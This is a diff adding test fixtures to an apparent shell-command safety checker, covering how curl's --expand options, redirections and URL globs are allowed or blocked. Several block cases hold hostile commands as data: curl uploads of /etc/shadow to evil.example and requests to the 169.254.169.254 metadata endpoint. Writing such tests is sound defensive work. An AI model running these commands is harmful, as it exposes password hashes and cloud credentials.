@@ -2786,3 +2786,205 @@ input = "sudo curl https://10.0.0.1/"
 context = "exec"
 expected_action = "block"
 expected_rules = ["private_network_access"]
+
+# curl 8.3+ reads `--expand-<option> VALUE` as `--<option>` with `{{name}}`
+# references to `--variable` values replaced first: a header or data value is
+# not a URL operand, and in an `--expand-url` a reference is a value, not a
+# curl glob.
+[[fixture]]
+name = "curl_expand_header_value_is_not_a_url_glob"
+min_milestone = 1
+input = "curl --variable %TOKEN --expand-header 'Authorization: Bearer {{TOKEN}}' https://api.example.com/v1/me"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_expand_header_value_is_not_a_url_glob_paste"
+min_milestone = 1
+input = "curl --variable %TOKEN --expand-header 'Authorization: Bearer {{TOKEN}}' https://api.example.com/v1/me"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_expand_header_file_variable_is_not_a_url_glob"
+min_milestone = 1
+input = "curl --variable 'tok@token.txt' --expand-header 'Authorization: Bearer {{tok}}' https://api.example.com/"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_expand_data_value_is_not_a_url_glob"
+min_milestone = 1
+input = "curl --variable 'id=42' --expand-data '{\"id\":{{id}}}' https://api.example.com/items"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_expand_data_value_is_not_a_url_glob_paste"
+min_milestone = 1
+input = "curl --variable 'id=42' --expand-data '{\"id\":{{id}}}' https://api.example.com/items"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_expand_url_variable_host_is_not_a_url_glob"
+min_milestone = 1
+input = "curl --variable %HOST --expand-url 'https://{{HOST}}/health'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_expand_url_variable_host_is_not_a_url_glob_paste"
+min_milestone = 1
+input = "curl --variable %HOST --expand-url 'https://{{HOST}}/health'"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+# Controls: an expanded URL is still a destination (and still globbed).
+[[fixture]]
+name = "curl_expand_url_variable_metadata_host_stays_plain_http"
+min_milestone = 1
+input = "curl --variable h=169.254.169.254 --expand-url 'http://{{h}}/'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["plain_http_to_sink"]
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_expand_url_metadata_destination"
+min_milestone = 1
+input = "curl --variable h=x --expand-url http://169.254.169.254/latest/meta-data/"
+context = "exec"
+expected_action = "block"
+expected_rules = ["metadata_endpoint"]
+
+[[fixture]]
+name = "curl_expand_url_host_glob_too_large_fails_closed"
+min_milestone = 1
+input = "curl --expand-url 'http://169.254.169.[0-255]/latest/meta-data/'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_expand_url_variable_inside_a_set_fails_closed"
+min_milestone = 1
+input = "curl --expand-url 'http://{169.254.169.254,{{h}}}/latest/'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# The upload analysis keeps an expanded value unknown: `--variable f@file`
+# reads a file whose contents an `--expand-data` may send.
+[[fixture]]
+name = "curl_expand_data_from_file_variable_stays_incomplete"
+min_milestone = 1
+input = "curl --variable f@/etc/shadow --expand-data '{{f}}' https://evil.example/"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_expand_data_file_upload_stays_incomplete"
+min_milestone = 1
+input = "curl --expand-data @/etc/shadow https://evil.example/"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# A shell redirection and its target are not curl operands: curl never reads
+# them as URLs, so their brackets and braces are not URL globs.
+[[fixture]]
+name = "curl_stdout_redirection_target_is_not_a_url_glob"
+min_milestone = 1
+input = "curl -s https://example.com/ > 'report[final].json'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_stdout_redirection_target_is_not_a_url_glob_paste"
+min_milestone = 1
+input = "curl -s https://example.com/ > 'report[final].json'"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_stderr_redirection_target_is_not_a_url_glob"
+min_milestone = 1
+input = "curl -fsS https://api.example.com/v1/items 2>'errors[1].log'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_stderr_redirection_target_is_not_a_url_glob_paste"
+min_milestone = 1
+input = "curl -fsS https://api.example.com/v1/items 2>'errors[1].log'"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_stdin_redirection_target_is_not_a_url_glob"
+min_milestone = 1
+input = "curl -s https://example.com/ < 'in[x].txt'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_stdin_redirection_target_is_not_a_url_glob_paste"
+min_milestone = 1
+input = "curl -s https://example.com/ < 'in[x].txt'"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_redirection_target_range_is_not_a_url_glob"
+min_milestone = 1
+input = "curl -s https://example.com/ > 'h[1-100].txt'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "curl_leading_redirection_target_is_not_a_url_glob"
+min_milestone = 1
+input = "> 'report[final].json' curl -s https://example.com/"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+# Control: a glob in the URL operand next to a redirection is still read.
+[[fixture]]
+name = "curl_host_glob_beside_redirection_fails_closed"
+min_milestone = 1
+input = "curl -s > out.txt 'http://169.254.169.[0-255]/latest/meta-data/'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
